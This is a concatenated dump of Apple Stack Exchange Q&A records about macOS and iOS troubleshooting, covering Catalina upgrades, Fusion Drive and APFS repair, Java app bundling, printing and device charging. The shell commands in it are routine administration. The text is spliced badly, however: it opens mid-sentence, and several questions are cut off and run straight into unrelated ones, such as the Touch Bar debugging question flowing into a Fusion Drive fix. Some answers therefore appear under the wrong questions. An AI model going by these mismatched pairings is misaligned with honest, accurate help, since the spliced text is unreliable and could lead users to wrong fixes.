reconfigured to use a separately supplied framework without having the source code and altering the application before compiling an altered version.\nIt's also worth mentioning that PDFKit in Sierra has many critical bugs!\n", "Q: Will airdropping FCPX to another computer work? Will Final Cut Pro X work if I airdrop it from one mac to another, and the macs use two different Apple IDs (through just airdropping the .app file, not other files).

In iOS 13, when I try to share something, the first row is all suggestions about who I should text whatever I’m reading to. How can I disable this “feature” so that it stops taking up space in the share menu?\n\nA: The only workaround I have found so far is by deleting the conversations with all the suggested contacts.\nIf you use Signal/Whatsapp to communicate anyway, it is not a big deal.

Apple Music allows you to download an unlimited number of songs onto your phone or computer and then listen to them while not connected to the internet. What prevents someone from subscribing to Apple Music, downloading a large number of songs, and then stopping their subscription?\nI assume that when you try to play a song, even one that is downloaded, the software (iTunes or the iOS Music app) checks your account status to ensure you are still an Apple Music subscriber. But what if you keep the device off of the internet? Apple would have no way of knowing if you are still a subscriber or not.\nThe only thing I can think of is that the songs have some sort of timestamp on them tracking when the service last verified your account; and that they will stop working after some period of time if it is not verified again. If this is how it is done, what is that time period? How long can you go without connecting to the internet while listening to a song downloaded from Apple Music?\n\nA: They store the tracks in a different location than normal music and validate your subscription periodically when you play the files. \nI believe the check in are quite rare as the system only promopts to renew tokens if you don’t otherwise connect regularly. I’ve seen it maybe three times a year lately. Even being offline a month, the token isn’t expiring in my experience. \nThis system seems designed to make it easy to re-up and give people latitude and runway in the mean time rather than to prevent any and all short term gaps. Clearly, if you’re online when you cancel, music would and should expire the music, but I’m not seeing that happen aggressively when you still pay for the service in practice or it lapses at the end of a subscription period. \n", "Q: Brother MFC-8840DN and OS X Catalina I have a Brother MFC-8840DN network printer/scanner/fax machine that I've been using with my Mac since Snow Leopard.\nWith Catalina, Apple is dropping support for 32-bit applications, which would include the driver and the scanner/fax application (both from Brother).\nWill I be able to get my printer to work with Catalina?\n\nA: After upgrading, the existing printer instances (CUPS and BR-Script3) worked as they had in OS X Mavericks (and earlier).  Both suffered from the inability to remove the job from the queue after printing, but this isn't related to Catalina.\nI created a new printer instance, using the Brother MFC-8840D BR-Script3 driver and everything works as expected, including clearing the queue.\nNote: OS X does not recognize the device's scanner feature, so I cannot use Preview to Import from scanner....\n\nA: Whether it's a scanner or printer issue, one has to update the printer-scanner's software to 64-bit.\nI got the updater and installed it on my Mac first\nhttps://support.brother.com/g/b/downloadhowto.aspx?c=us&lang=en&prod=mfc8890dw_all&os=10060&dlid=dlf104915_000&flang=4&type3=318\nThen I connected the printer to my Mac and ran the updater. \n", "Q: Touch Bar and Visual Studio code I am debugging a Java class with Visual Studio Code but, the  buttons on my touch bar do not work as expected except for Reset (cycle arrow) and Stop command (square).

However, I did something wrong with diskutil, and now have two disks in the system: \n\n\n*\n\n*Untitled - 3 TB\n\n*Apple SSD128E Media - 121 Gb, empty\n\n\n\n\nI know that I have only one Fusion drive of 3 TB on my Mac. \nWhat is the second drive or volume for? Is it part of my Fusion Drive? Should I and how do I delete it? \nI have also noticed that in Recovery Mode where is no local source of MacOS for recovery so I had to do Internet Recovery (and it was MacOS Snow Leopard I believe). Could these two issues be connected? \n\nA: It looks like your Fusion Drive got split. Apple has some instructions here explaining how to fix it. I have copied the instructions here, but they made be easier to read and more up to date at the link above.\nThe fix will permanently delete all data on these drives, so make sure you have a good backup before you proceed!\nIn your case, you may want to get to a newer version of macOS Recovery as Mojave and above have a single, simple command to fix this issue.\nTo boot to the newest version of macOS recovery that your system can run, do the following:\n\n\n*\n\n*Shut down your computer.\n\n*Hold down Option + Command + R to\nboot into the most up-to-date version of macOS Recovery online. This\nwill likely be the Mojave or Catalina version of macOS Recovery.\n\n\nIf you booted to Mojave or Catalina recovery, here's what Apple says to do next:\n\n\n  \n*When you see the macOS Utilities window, choose Utilities > Terminal\n  from the menu bar.\n  \n*Type diskutil resetFusion in the Terminal window, then press Return.\n  \n*Type Yes (with a capital Y) when prompted, then press Return.\n  \n*When Terminal indicates that the operation was successful, quit\n  Terminal to return to the macOS Utilities window.\n  \n*Choose Reinstall macOS, then follow the onscreen instructions to\n  reinstall the Mac operating system.

I shall assume that its successors, i. e. Music, Podcasts and TV, do so as well. \nClassic MP3 files, however, use a different metadata tag format: ID3, which has no official, documented way to mark a file as an audiobook. (One can use any string for TCON content type, usually labeled genre, but that does not seem to matter to iTunes.) The kind of audio can manually be set in the iTunes GUI, but this will apparently not add or change the ID3 tag in any way, instead just update the database entry and possibly file location. This has been documented many times on the web, as has converting the MP3 into an AAC MP4. \n\n\n*\n\n*Is there any way to tag an MP3 file in such a way that Apple audio players/managers will import it as an audiobook without manual correction?\n\n\nAs an alternative, Iʼm considering to put a remuxed MP3 audio stream (i.e. not reencoded with AAC) into an MP4 container (v2, i.e. MPEG-4 Part 14, .m4b file extension), but I donʼt know yet whether Apple supports them correctly. \nMP3s can also use different tag formats, e.g. APE from Monkey's Audio, but as far as I know none are recognized by iTunes.\n\nA: No, there is no documented way to mark MP3 files with ID3v2 tag as audiobooks in a way that Apple products (or any hardware or software player really) would understand. There apparently is also no undocumented way known either.\nAlthough there is a public Github repository, the development of ID3v2 has stalled for over a decade now and should not be expected to be picked up ever again, because more recent container formats, like MOV-based Part-14 MP4, use different metadata formats. \n", "Q: Supplemental update stuck on installation screen - how to break free? Mojave, Mac Mini late 2014. \nTried to install Supplemental Update 2, but it froze. Progress bar was only 1 cm. After 2.5 hours, forced it shut, then used CMD+ALT+P+R and now progress bar slowly got to the end, filling entire bar... and stuck. \nForced it shut again, then tried to reach both Recovery Mode and Safe Mode.\nIt will not go there, just keeps installing.\nIt has been several hours since leaving it to do it and no changes at all. Progress bar is full, but nothing happens.\nAt this point I just want to break free from installation screen and get to my files. Is there any way to do this or do I really have to go to technican?\n\nA: In general, Apple software updates will try again and if you’re stuck, you’ll eventually need to power off the machine and risk leaving the disk in a bad state.\nI would power down and try restarting and see how it goes. Worst case, use Internet Recovery when you can to install whatever version of OS you want. As long as you don’t install an older version, your data should all be intact. Command R is the usual command to initiate internet recovery when you hear the power on chime or see the Mac start to power up. \nSometimes booting in Safe Mode (hold shift) can get past an install that’s staged, so that’s a long shot if you don’t want to seek hardware service or have a bootable OS brought to the mac so you can triage further.\n", "Q: Apple Watch Series 2 will not pair with iPhone 11 Pro So I just upgraded my iPhone to the iPhone 11 Pro and went to pair my existing Series 2 Apple Watch with it - I have reset the Apple Watch to factory defaults, and attempted to pair it using the normal flow through the Apple Watch app on the iPhone.\nThe iPhone will not accept the geometric pattern displayed on the Watch for pairing, it simply does nothing when I present it to the iPhones camera during the pairing process in the Apple Watch app.  I have tried various lighting levels and locations, distances from the Watch etc.\nIf I choose the manual flow, I am asked to choose the Apple Watch to pair via the 5 digit name, which displays correctly on both Watch and iPhone - the iPhone then asks me to enter the 6 digit code which is displayed on the Watch, but the watch never displays any code (it does not update from the \"Use this name to select your Apple Watch for manual pairing\").\nThis Watch worked perfectly on my older iPhone 6S Plus literally until this morning.\nThings I have tried without success:\n\n\n*\n\n*Updated iPhone to latest iOS 13\n\n*Reset Apple Watch again\n\n*Closed all apps on iPhone\n\n*Rebooted iPhone\n\n*Forgot my current wifi network\n\n\nA: I was able to solve the issue on my end...\nProblem: new iPhone 11 pro with iOS 13 won't pair with Apple watch series 2.\nSo the problem was that my old iPhone 6s was on iOS v10 and watch on v3 and iPhone wouldn't upgrade my watch to the newer watch OS, probably due to OS compatibility.\nUnfortunately there is no option to upgrade iPhone to version 11 or 12 - you can upgrade to the latest version only. I've took a risk and upgraded my old iPhone 6s to the latest iOS hoping that as long as it is paired with watch it would upgrade watch OS, but it didn't work out and I've got 2 phones unable to pair with my watch.\nI found a friend, who was on iOS 12 and used his iPhone to pair.

I'll store the password and look it up when necessary, rather than easily accidentally remember the Screen Time passcode.\nIs there any way to use an alphanumeric password rather than a 4-digit PIN?\n\nThis is similar to the main iOS device passcode, which does allow for more secure input:\n\nEnter a six-digit passcode. Or tap Passcode Options to switch to a four-digit numeric code, a custom numeric code, or a custom alphanumeric code. (link)\n\n\nA: I found one workaround for that:\nTell your friend to make a random Passcode and copy-paste it in locked note whose password is copied in another note. It tricks your brain and you just don't want to write password.\n", "Q: Apple San Francisco font usage for websites as a system font I lately see many websites that uses Apple SF font as a system font and I very doubt that they have license for it. Is there a trick to do, so it can be used in a site legally?\n\nA: Encouraged Behaviour\nIn Apple's case, Myles Maxfield of WebKit explained how to use the system fonts:\n\nWeb content is sometimes designed to fit in with the overall aesthetic of the underlying platform which it is being rendered on. One of the ways to achieve this is by using the platform’s system font, which is possible on iOS and OS X by using the -apple-system CSS value for the “font-family” CSS property. On iOS 9 and OS X 10.11, doing this allows you to use Apple’s new system font, San Francisco. Using -apple-system also correctly interacts with the font-weight CSS property to choose the correct font on Apple’s latest operating systems.\n\nWebKit is an Apple funded and directed project.\nMore generally, HTML/CSS can specify either local or remote fonts be used. If a specified font is available locally, it is presumed legal, and used by the browser.\nIf the site is distributing a font, then the site must have a licence for the font's distribution and use.\n", "Q: What is the host \"xp.apple.com\" for and what is sent there? Ever since I have installed a Pi-hole DNS/DHCP server at my home, I see the host xp.apple.com pop up as one of the most blocked hosts.

I am aware of Apple's server connection information but there's no mention of what kind of data is transferred. Also, several internet searches did not bring any more info about it to light.\n\nA: It seems to be related to the app store and os updates. All my apple devices attempt to connect to it during updates. On MacOS the processes which attempt connection are commerce, appstoreagent, rtcreportingd and App Store.\nI would speculate that it is for some kind of telemetry, as I have had it blocked for a couple of months now and it has never caused any updates to fail.

Given the above workaround, it seems that iTerm2 thinks my home directory is somewhere else. Any ideas?\nExtra details: I'm running MacOS 10.14.5. My username and home directory contains a space. Someone suggested that this might be part of the problem, but if the space is causing a problem, that doesn't explain why it only became an issue after updating iTerm.\n\nA: (Given the age of this question, I'm mostly posting this for others like me that have different circumstances but the same error message.)\nI had that same error after my employer changed my username, but migrated all my files to the home directory of the new user.  Of course that didn't correct any path references in my files.\nI had to hunt through the com.googlecode.iterm2.plist config file for references to my old username.  In doing so I found that there was a line containing login -fp \"old_username\".  Changing this to login -fp \"new_username\" fixed the issue for me.   I suspect the quoting for that command is wrong with your username that contains a space.\n\nA: Go to Preferences > Profiles and change the Working Directory setting from \"Home directory\" to \"Directory:\", then enter the path to your home directory. If your home directory contains spaces or special characters, this might fix the problem. \nHowever, this doesn't explain the underlying cause of the problem, and is not an ideal solution. I'm posting this as the answer since it has worked for at least two people.\n\nA: My fix: I had the same issue with iTerm2 v3.3.12.  My fix was to quit and restart iterm2.  I had tmux up and running so I did not lose any of my sessions. - E\n\nA: I had the same problem, and it bothered me for a long time, and seeing the login -fp mentioned above gave me a hint:\n\n*\n\n*I checked the com.googlecode.iterm2.plist file and found this paragraph to configure the window arrangement function.\n\n\n*I deleted the original window arrangement and recreated it.\nProblem solved.\n", "Q: iMac running High Sierra is very slow — photoanalysisd can't be killed? My iMac running High Sierra has become painfully slow.\nI suspect photoanalysisd, as it's using a lot of CPU time, but I can't figure out how to get rid of it.\nThere's at least one other question (What is \"photoanalysisd\" and why is it using 77% of my CPU?) here about photoanalysisd, but my scenario is different and none of the suggestions in the other thread were helpful to me.\nLooking in the Console log, I see odd errors for photoanalysisd, e.g.:\n\"seekAndRead -- Input/output error\"\n\"error: (266) I/O error for database -- CLSBusinessCategoryCache.sqlite.  SQLite error code:266, 'not an error' errno:5\"\n\"error: -executeRequest: encountered exception = I/O error for database at ... CLSBusinessCategoryCache.sqlite.  SQLite error code:266, 'not an error' errno:5\"\n\nError code \"not an error\" -- huh?\nUsing the Terminal, I've tried all of the following:\nsudo launchctl remove com.apple.photoanalysisd\nsudo launchctl kill -TERM gui/$UID/com.apple.photoanalysisd\nlaunchctl disable gui/$UID/com.apple.photoanalysisd\nlaunchctl kill -STOP gui/$UID/com.apple.photoanalysisd\nlaunchctl kill -TERM gui/$UID/com.apple.photoanalysisd\n\nBUT photoanalysisd is still running, according to the Activity Monitor. Even after I issue commands to kill the process(!?), it's still there. Of course it also comes back when I restart, and slows the machine horribly again.\nFirst question, then: why don't these commands get rid of photoanalysisd?\nNext, I have tried starting in safe mode, but it makes no difference: the iMac is still unusable, until I issue commands to kill photoanalysisd.\nAlso, the screen updates are incredibly slow in safe mode. The desktop appears very slowly and is painted in bands like venetian blinds opening up from the bottom. Never seen this before.\nAgain, there is nothing in the Activity Monitor that is obviously eating up CPU or memory. Activity Monitor consistently reports over 90% idle, though the system is beachballing constantly.\nFinally, I have already re-installed High Sierra once, but it made no difference.\nI really don't care if the Photos app does the person recognition thing or not. I just want my Mac to be useable again.\nAny suggestions?\nEDIT: 25 days later, I still have no solution to this. My basic question about photoanalysisd (above) remains unanswered.\n\nA: If you use iCloud  photos and sync with another device, you can turned off the photos sync on Mac. In case you go to turn it back on and it gives storage full error, do as suggested in download iCloud photo to mac OS X Yosemite 10.10.3 in second paragraph. \nHowever this will bring the problem back if you would want to use photos later. So best shot can be leaving it on overnight by disabling sleep in System Preferences and keeping it plugged in. This might give it enough time to complete the analysis. \n\nA: Welcome to Ask Different. This is just a guess but my Mac was running slowly and began \"beachballing\" a lot. I couldn't figure out the cause so I restarted my mac in safe mode. It worked fine when I did that. That made me think it was an app I had in my login items. I removed a few of the login items and the machine returned to normal. I don't know which login item it was. Probably a 3rd party app.\n", "Q: This container can’t be split, because the resulting containers would be too small I understand this question has been asked before, but my situation is a bit different. I have done the usual, I've tried\ndiskutil cs list \nthen\ndiskutil apfs resizeContainer disk0s2 370GiB\n(from an original volume size of 402GiB). It gave me the error \nError: -69521: Your APFS Container resize request is below the APFS-system-imposed minimal container size (perhaps caused by APFS Snapshot usage by Time Machine),\nwhich was interesting because I have never used Time Machine and I erased all 'snapshots', not that there were any, on my disk already using \ntmutil thinlocalsnapshots / 9999999999999999.\nWhy is it that I keep getting this error? What am I missing? I want to use the free space from resizing on my Boot Camp partition to give it some breathing space, it's almost full. I'll be doing that using partition wizard later, but before I even think about doing that, I have to solve the problem here first.\nI'm on Catalina build 19A582a for those wondering, on an Early 2015 MacBook Pro 13\".\n\nA: Check to see if you have more snapshots...\ntmutil listlocalsnapshots /\n\nIn my case, thinlocalsnapshots didn't do the job totally. I had additionally run\ntmutil deletelocalsnapshots /\n\nAfter which there were no more with listlocalsnapshots and I was able to resize the container.\n\nA: I managed to resize. Firstly it should be noted that Mac now has support for resizing, but not in the old 'drag the pie chart' way it used to be. To resize, select the APFS container, and in the bottom right where the size is, change the value to your preferred size. This will result in the container being split, with a new disk containing the freed up space. How to give this space back to the disk as a whole, I'm not sure, but this was good enough for me.\nThe terminal command for doing this is:\nsudo diskutil apfs resizeContainer disk0s2 750g jhfs+ Extra 250g\nwhere disk0s2 is the target container, 750g and 250g are the size of the existing and new disk respectively, jhfs+ is the format of the new disk, and Extra means \"create a disk of this size\".\nThe total of the existing and new disks should add to be the size of the disk before being resized.\nsudo diskutil apfs resizeContainer disk0s2 750g jhfs+ Media 0b\nautomatically determines this size using the Media 0b extension, so this isn't necessary if you just want to resize.\nFor more help on this visit https://www.macobserver.com/tips/deep-dive/resize-your-apfs-container/, credit goes to the author.\n", "Q: Can't see images in mails I compose When I attach an image in a mail, I can throw it anywhere, inline, but it shows up as an image icon rather than actually showing the image:\n\n\n\nAny way I can fix this? It also doesn't allow me to make a signature with images.\n\nA: To make a signature with images go to Preferences under the Mail menu and click on signatures. You should get a panel that looks like the image below. In the area on the right, right-click and select Import Image. You can select the image you want in your signature.\nYou can also open an image you want to display. Select all and copy the image. You can then go to the panel shown below and paste into the area on the right.\nTo solve your problem about images not appearing you can try, instead of loading image into your message, the same method as above. Open the image and copy it, then paste it into your email.\n\n", "Q: Will my iPad get damaged if I connect it to a 18W power bank instead of the 10W charger in the box? I just bought a 6th generation iPad 2018 and was given a 10W charger along with it. I was wondering if I could use an 18W power bank to charge it. Will it damage my iPad?\n\nA: As long as the power bank is a USB standards compliant power bank, then it should not harm your iPad.\nNote however that even though a power bank or charger might be able to deliver for example 30W (or even more) - it doesn't mean that the iPad will be able to take advantage of that for faster charging. USB-standards compliant power banks and chargers only deliver higher voltages (and thus effect) when specifically asked for it by the device to be charged. \nFor example a 29W Apple charger will be able to fast charge an iPad Pro, but not an ordinary iPad. It will still charge the iPad, but it won't go faster than usual.\n", "Q: How do I examine and reduce what \"About This Mac\" categorizes as \"System\" disk use? In \"About This Mac\" my Storage shows a System disk use of 419 GB. Since my storage is a bit tight and I'm gearing up to update to Catalina (from 10.14.6), I'd like to clear as much disk space as I can, and this huge chunk attributed to \"System\" seems a good place to start. \nWhat is in System? How do I examine the details of what's there? How can I delete (safely) some of the things there consuming disk space?\n\nFWIW, I have a lot of local Dropbox files, use Google Drive, have a disk image on my drive, and have a bunch of Homebrew installed tools (in case any of these could wind up categorized as \"System\").\n\nA: You should get a copy of DaiseyDisk or GrandPerspective. These apps will produce a mapping of your hard drive so you can check what is taking up so much space.\n", "Q: Bundling Java applications for Mac OS X Catalina I write amateur Java scientific applications which I provide freely for a small audience. (Probably I am the main user.) Most of them are still compiled under Java 1.6 where they run fine on Mojave either as jar files or as applications with the standard package contents structure shown below.\n\nUnder Catalina the applications no longer launch and I get a screen telling me that I need to install the legacy Java SE 6 runtime, which, of course, is already installed.\n\nHowever if I remove the jar file (here Motivator.jar) from the app package and double-click it on the desktop (right-clicking to by-pass Gatekeeper) it runs fine.\nSo in one sense I am OK. But this is a Mac and I would prefer my applications to look like Mac applications on the desktop and when they run (i.e. not have the name of the class with my main method show).\nAnyone know if it is possible to package a jar file as a Mac application any more? I can recompile with a higher version of Java if I have to.\n\nA: Disclaimer\nThis is a provisional answer to my own question, which I will not accept until I have finally tested it. However, as people are encountering various problems with Java apps on the Mac I thought it useful to post to help others and allow suggestions for improvements.\nReason for the Behaviour Explained\nIt turned out that:\n\n\n*\n\n*The reason that my application failed to run was because the Catalina update had removed the Java SE 6 Runtime from the JavaVirtualMachine directory where it resided on a machine running an earlier version of  Mac OS X: /Library/Java/JavaVirtualMachines\n\n*My application ran as a ‘naked’ jar file because there was a copy of Java 1.8 from Oracle in that directory which Jar Launcher (the app that handles jar files) must have employed.\n\n*When I copied the 1.6.0.jdk directory from another machine into the JavaVirtualMachine directory (just dragged and dropped it all over — needed an admin password) it ran from the packaged app as shown below.\n\n\n\nGeneral Point: Apple’s legacy Java SE 6 Runtime does run under Catalina\nThere is an article on  Ars Technica that states:\n\nAnd a few longstanding components of macOS haven’t made the jump to 64-bit. These include… the old Apple-maintained Java 6 Runtime… \n\nThis had suggested to me (as also the kind comment by @greg-449) that the Java SE 6 Runtime was 32-bit. However I found a thread on the MacRumors forum about the different problem of Catalina preventing installation of Java SE 6 Runtime for a commercial app that requires it. When that was eventually overcome, the app worked. This was what caused me to check things out, confirming that Apple’s legacy Java SE 6 does run under Catalina.\nA solution for the developer — replacing the JavaApplicationStub?\nTo re-emphasize, I am concerned with delivering a Mac app that just works after the user has performed an easy Java install. I can’t expect him to fiddle around trying to install the legacy Java 6 runtime to get my app to work. \nIt would seem that it is the JavaApplicationStub (in the application bundle) that ‘informs’ the system where the Java runtime is to run the application. Originally this could be handled for the developer by a little Apple utility, jarbundler, which never worked with Oracle Java runtime. (Thanks @abc for reminding me of this.) However it turns out that there have been ways round this problem, as described on this Stack Overflow post, and there is a replacement for JavaApplicationStub: universalJavaApplicationStub — on GitHub. \nThis latter seems to be the way to go, and I will update this answer when I have tested it.\n", "Q: How do I backup account passwords and and other data on Catalina? I have always relied on using an encrypted backup of my iPhone to preserve account passwords as part of the backup, so that these can be easily restored when I move to a new phone. But this feature relies on iTunes, which has been removed from Catalina.\n\n\n\nHow do I create an encrypted backup of my iPhone that preserves account passwords and and other data on Catalina, so that these can be restored when I get a new phone?\n\nA: https://support.apple.com/en-in/HT205220#encrypt\nHas the screenshot\n\nFrom the General tab or the Summary tab, select \"Encrypt local backup\" under the Backups section.\n\n\n\nA: If you encrypt the backup, your account passwords and settings will be saved. In addition, your account preferences are usually automatically saved in your iCloud session . But, first do an iCloud Backup... for security reasons\n\n\n\n", "Q: Replacement for Supercard in Catalina? I have been a long time Hypercard fan. When Apple mysteriously dropped it, I kept my Hypercard stacks going using Supercard. Unfortunately, Supercard is not 64 bit compatible (and no sign that that is going to happen any time soon), and so will not run under MacOS Catalina.\nMany of my Hypercard stacks are really just fancy Address books, and I could export them to Apple's Contacts app. \nHowever, I have a more sophisticated complicated stack that is really like a  little customer database ... \nMy Question is:  Are there are any free or simple (but good) apps that you would recommend for that purpose:  one card per person, usual entries for email and contact information, and then which version of the software they are using and similar. Simple database or even simpler than that might suffice. All suggestions appreciated.\n\nA: LibreOffice contains a database application, Base. There are several available Address Book templates, which you could modify.\n(I note that SuperCard are blaming Apple for 'going back on their promise to release a 64-bit Carbon framework'. A 64-bit version was noticeably absent in 2007, and Apple deprecated Carbon in 2012...)\n\nA: If you are a longtime HyperCard and Supercard fan, then I am surprised you have not heard of LiveCode. It is a cross-platform x-talk language based development environment. LiveCode is the continuation of a previous cross-platform HyperCard derivative, Metacard. Back when I used Metacard, many HyperCard stacks were runnable unchanged and most with just minimal changes.\nDetails are available at the LiveCode website.\n", "Q: Can an iPad Pro Charge a MacBook Pro? I have a 2018 iPad Pro and a recent MacBook Pro (with USB C). Is there any way I can control what charges what when I connect the two? If I connect the two with a USB-C charger, my MacBook automatically starts charging my iPad. Can I have it work the other way around? Can I have it not transfer power, and just be used to transfer data (like for Sidecar)?\nThis poses a more general question about USB-C: How can you control what direction power goes? I have a USB-C Battery that automatically charges my laptop or iPad when I plug it in, but as soon as the battery dies, the MacBook/iPad will start charging the battery!\n\nA: While the iPad Pro can charge other devices off of it, including other iPad Pro devices, I see no indication that charging a device like a MacBook is possible.\nI don't see any feature in which you can disable power transfer while connected via USB-C, like while using Sidecar in a wired configuration.\nApple does have instructions on how to charge another iPad Pro from the iPad Pro, including how to select which iPad Pro charges which:\n\nIf you have two iPad Pro models with USB-C ports, you can connect them\n  directly with a USB-C cable. One iPad Pro will draw power from the\n  other. If you want to change which iPad Pro charges, unplug the USB-C\n  cable and then reconnect them.\n\nYou could try the above with your MacBook and iPad Pro, but it's unclear if that would work.\n\nA: \nThis poses a more general question about USB-C: How can you control what direction power goes?\n\nYes.  Apple computers and devices have a kind of short memory on which direction the power flows.  If you plug two Apple devices together with a USB-C cable and the power is flowing the \"wrong\" way then unplugging one device and plugging it back in will reverse the flow of power.  I heard that in some cases if left too long the computer or device supplying power will stop supplying power, as the battery runs low, and ask for a charge.\nOne sure way to force direction of power flow is with a USB-C to USB-A male cable plugged into a USB-C to USB-A female adapter.  The power will flow from the side with the female port to the side with the male jack.\nThe level of power flow should be no different with either setup as the USB-C ports will supply only 5 volts, and the maximum current will be 1.5 amps or 3.0 amps depending on the hardware and how much power other things are asking for.\n", "Q: Books Art Not Downloading from iCloud My books are no longer downloading the art (book cover) from iCloud on my iPhone. They show up on my Mac. I noticed that the new books look different in the finder as well. Anyone one have any idea how to fix this? Seems to be since I downloaded Catalina. \n\n\n\n\nA: So, I was facing the same problem and it was super bugging me. I have \"kind of a fix\": instead of uploading the book through Mac OS, do it on the iPhone.\n\n\n*\n\n*Delete the book from all devices and iCloud.\n\n*Put the .epub or .pdf file in a folder on iCloud (just like any other file, like on the Documents folder)\n\n*Click on it on your iPhone.\n\n\nIt will open Books and sync it with the cover! But I had the problem that, if I had Books open at the same time on my Mac, the book would disappear. So I just left Books open on iPhone, did all the books, and then opened on my Mac.

I'm trying to understand how to remove an item from \"Look Me Up By Email\". This app was uninstalled a long time ago and it's still showing on my Mac.\nI also did a clean install of macOS Catalina. I don't know what more I can do. It's a bug or maybe I have a virus on my Mac (MacBook Air early 2015, macOS Catalina 10.15.1)?\n\nI received a letter from MarginNote, but there's nothing useful here!\n\nThis is just a residue in the look-me-up list.The app does not have\naccess to refreshing the list when it is uninstalled on your devices.\nWe do have forwarded this issue to Apple’s dev team about this issue\nand hopefully, it could be fixed eventually. A couple of words about\nthis if what you are actually concerned about is your privacy\nprotection. The feature is added in MarginNote 2 given that app\nsupports sharing an exported notebook to a fellow MarginNote user so\nthat some sort of teamwork can be achieved. It serves only this\npurpose and no more than that. Plus, ticking it off in the list is\nalready an effective measure to turn it off for good. To sum up, it is\na left-over option that can be turned off and will not affect your\n(un)using of your macOS device.\nRegards, MarginNote Support Team\n\n\nA: The GUI is located in the Apple ID > iCloud >  Options -> Look Me Up By Email window.\nMine is blank:\n\nSo why is mine blank and your filled? Because Apps that use iCloud can offer this service to other iCloud users so that they can find you.\nAs discussed here and here and here and here, one way to remove the app is to delete it.  It may be that some apps give you the ability to turn it on or off, but it's really an app thing.\nEDIT:\nIf the MarginNote application is not installed and you are still seeing this GUI, try this:\n\n\n*\n\n*Open Terminal.\n\n*Type: find $HOME -name '*MarginNote*' -ls\n\n*Post the output.\n\n\nIf that doesn't work, then try this: \n\n\n*\n\n*Install on a new machine (or in a VM), just so we know everything is clean.\n\n*Log in but do not add your Apple ID.  You should not see anything in the \"look me up by email\" GUI.\n\n*Log into iCloud but disable every service. If you see things in the GUI, then it's somewhere in your iCloud count that you can't reach.\n\n*Sync just the iCloud drive. If it appears, then there is a file in your iCloud drive that has this information. Go into Terminal and list all of the files with the \"find $HOME -name 'MarginNote'\n\nA: Here's just an idea (I don't have this problem so I can't exactly test it out for myself). Open terminal, and simply type defaults read | grep -aiC32 MarginNote. The defaults read part lists out all of the preferences stored across any applications/plist files on your computer. If you find something in there, you'll need to figure out how to use defaults in order to edit it (that depends on what exactly it is that you find - though if you find something and have no clue how to proceed then just reply with your results and I can help you out). This may very well be inaccessible in iCloud, but if there's anywhere you can find it which maybe just might be editable, it would be in the plist files defaults helps you access.\n", "Q: Is there a 64-bit app for working with image sequences to replace Quicktime 7? I've been using Quicktime 7's \"Movie to Image Sequence\" and \"Open Image Sequence\" export and import options forever. It's useful for creating and working with time-lapses, modifying a single frame or a couple of frames in a video, creating short animated gifs, etc.\nUnfortunately Quicktime 7 is 32-bit, so once I upgrade to Catalina it will be gone forever. I'd like a recommendation for a 64-bit app with similar features: the ability to export every frame of a movie to a sequence of still images, and construct a new movie at a specified frame rate from a set of still images.\nIs there any good replacement for this Quicktime 7 feature? Free is optimal but not necessary.\n\nA: ffmpeg\nThe command line tool ffmpeg can be used to create videos from images:\n\n*\n\n*How to create a video from images with FFmpeg?\n\n*How to create a video from images using FFmpeg?\n\nA: QuickTime Player in Cataline (and probably earlier versions) allows you to import an image sequence exactly as with QuickTime 7 and export it as a movie.\nOpen QuickTime Player. Go to File > Open Image Sequence and select the images or folder that you want to use in your timelapse. Now you get an option to select resolution, frame rate, and encoding.\nNote! I have had some issues getting it to import all selected images. What instead works for me is to select the folder with the images for my timelapse, then it correctly imports all of the images.\nUnfortunately, I have not seen an option for doing the opposite in QuickTime Player in Cataline, i.e. importing a video and exporting it as an image sequence.\n\n\n", "Q: macOS Catalina command line tools and gcc errors during installation Command Line tools are giving a multitude of errors when trying to install MuJoCo.

What steps should one take to ensure that the command-line tools and gcc on Catalina are working as expected?\n\nA ticket was open on the MuJoCo-py project here.\n\nA: It is not your command line tools which are failing. Quite obvious, this is a compiler error and it seems like the python library was developed against a different set of headers - the compiler merely states a mismatch.\nSo gcc is working as expected - the python library‘s C extension is outdated. I fear there is little you can do aside from what you presumably already have done, namely opening a ticket in the MuJoCo-py project.\nP.S.

All is well so far. Now, using Preview, open the pdf file that you just created, and say you want to print pages 2-3 (or the entire document, it does not really matter) as a new pdf file. On my end, this is not working. I get an error message: Print. Error while printing.\nDo you know of any resolutions, or should we just wait for the next update of macOS to solve this?\n\nA: I have experienced a problem similar to yours. \nUnfortunately for us, there seems to be no solution, but \"the answer\" to our questions was revealed in my telephone call to Apple Care. During this support call, a \"second-level\" tech support person stated:\n\n\"Apple doesn't actually support PDF files with Preview. There is nothing we can do to help you.\"\n\nUPDATE/EDIT:\nA subsequent call to AppleCare got me to a different support person who was not afflicted with an attitude. Apple subsequently reviewed a copy of my PDF document, duplicated the behavior I saw, and collected some \"system data\" from my Macbook. I finally got the results of this, and Apple has indicated they have found an issue that will be addressed in a future update.\n\nA: The essential difference between Safari's Export as PDF and Save As PDF in the print menu is that the latter involves the print architecture, and the former does not. As mentioned in the comments, it's possible that old 32-bit print drivers may be causing problems in Catalina's 64-bit clean environment. Of course, this would be noticed when printing to paper, too.\nYou can create a 'Generic Printer' print queue, and select that as your Printer whenever you Save As PDF in the print menu. \nOne other tip: for individual pages, you can drag the thumbnails out of Preview to the Finder.\nIt's also worth noting that Adobe's Acrobat app prohibits and prevents printing a PDF to a PDF, instructing the user to Export or Save As instead. I suspect most of the reasons for this prohibition relate to the loss of metadata -- bookmarks, annotations, Keywords, encryption, etc -- that will occur when a PDF is printed. Though there may be other reasons for doing so.\n", "Q: \"macOS Catalina\" could not be verified I'm trying to upgrade my MBP 2018 to Catalina, but everytime I finished download it, the error pop up as below:\n\nI downloaded it almost 10 times, but no success\n\nA: Finally I got MBP upgraded to catalina!

